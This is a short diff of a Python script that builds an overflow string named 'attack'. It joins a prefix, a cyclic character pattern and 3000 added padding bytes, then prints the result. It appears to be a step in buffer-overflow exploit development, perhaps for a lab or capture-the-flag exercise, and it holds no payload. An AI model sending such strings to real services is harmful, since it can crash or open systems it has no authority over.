@@ -18,6 +18,9 @@ for a in range(0x41, 0x5A):
     for i in range(0x30, 0x3A):
         for j in range(0x30, 0x3A):
             chars += chr(a) + chr(a) + chr(i) + chr(j)
-attack = prefix + chars
+
+padding = 'F' * 3000
+
+attack = prefix + chars + padding
 
 print(attack)
